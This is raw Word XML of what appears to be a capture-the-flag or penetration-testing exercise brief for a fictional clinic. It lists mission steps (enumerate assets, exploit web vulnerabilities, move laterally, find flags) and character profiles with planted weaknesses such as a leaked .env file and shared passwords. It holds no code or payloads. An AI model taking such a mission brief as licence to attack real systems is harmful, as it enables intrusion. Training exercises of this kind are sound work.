          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book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sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Y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our</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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M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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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n</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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You are 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u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thor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i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z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ed to:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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nu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er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 pe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imeter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d inte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l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ets</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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Att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empt exploi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 u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ng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web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y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em vu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nera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il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it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ies</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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er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orm late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l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ovem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nt</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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Cap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ure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ny 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v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of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curi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y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pr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ct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es</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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ete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mi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 w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ether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da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xpo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ure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ur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ed</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="108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•         </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="23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ent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y all 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“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la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g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ilu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”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="264" w:lineRule="auto"/>
        <w:ind w:left="1080" w:right="1719"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:footerReference w:type="default" r:id="rId14"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="600" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="325" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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ac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flag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y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ou r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over r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p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re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ts a breakdown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4"/>
          <w:szCs w:val="24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n X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R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Y Clini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’s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defe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ns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. Ea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h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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>l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ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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le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4"/>
          <w:szCs w:val="24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ds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y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ou dee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p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er into the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b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rea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h.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ac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h bread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ru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m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b</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="4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gives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a hint as to Mannie’s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identi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ty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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="80"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:pict>
          <v:shape id="_x0000_s1125" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:-2.35pt;margin-top:0;width:616.75pt;height:35.25pt;z-index:-1901;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
            <v:imagedata r:id="rId15" o:title=""/>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:shape>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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Key P</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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rson</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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el</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="3" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1080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pict>
          <v:shape id="_x0000_s1124" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:384.8pt;margin-top:82.15pt;width:159.95pt;height:84.95pt;z-index:-1900;mso-position-horizontal-relative:page;mso-position-vertical-relative:page">
            <v:imagedata r:id="rId16" o:title=""/>
            <w10:wrap anchorx="page" anchory="page"/>
          </v:shape>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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Moo </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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(</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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Contra</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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t </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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D</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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evelo</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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p</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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er)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Wears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hoodies. Slee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p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u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der his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de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k.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Left de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b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ug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ode in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p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rodu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tio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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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U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“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m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oo” as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4"/>
          <w:szCs w:val="24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u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4"/>
          <w:szCs w:val="24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na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m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 on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everythin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g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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Once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mm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itted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n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ntire .e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v file to p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u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blic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Git.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="160" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="16"/>
          <w:szCs w:val="16"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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Man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ie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(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???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)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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pp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ears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in log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, but n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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>v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er in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p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er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on.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Has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to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dmin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 xml:space="preserve"> p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4"/>
          <w:szCs w:val="24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ges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no o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 el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e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an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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="5" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1080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pict>
          <v:shape id="_x0000_s1123" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:417.75pt;margin-top:-46.15pt;width:98.4pt;height:69.55pt;z-index:-1899;mso-position-horizontal-relative:page">
            <v:imagedata r:id="rId17" o:title=""/>
            <w10:wrap anchorx="page"/>
          </v:shape>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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•        </w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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R</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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esp</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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on</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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to XSS </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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b</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ea</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ns</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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but n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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e</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ver at</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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t</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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ds </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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m</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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eeting</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1080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404040"/>
          <w:position w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Either a gho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>er…</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>or a gho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:position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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1080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pict>
          <v:shape id="_x0000_s1122" type="#_x0000_t75" style="position:absolute;left:0;text-align:left;margin-left:451.5pt;margin-top:10.45pt;width:71.1pt;height:106.35pt;z-index:-1898;mso-position-horizontal-relative:page">
            <v:imagedata r:id="rId18" o:title=""/>
            <w10:wrap anchorx="page"/>
          </v:shape>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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Dr.</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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Dean</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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a Hartwell </w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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(</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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O</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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w</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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n</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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e</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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r)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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Legit. Hard-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w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orking.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v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r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w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hel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m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ed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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U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the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m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e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p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4"/>
          <w:szCs w:val="24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w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ord on ev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ry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w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ork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ta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ion.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080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•        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="20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hinks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“fire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w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all” is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 xml:space="preserve"> s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4"/>
          <w:szCs w:val="24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m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ething her IT guy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lights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u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p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on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w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k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nd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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="240" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
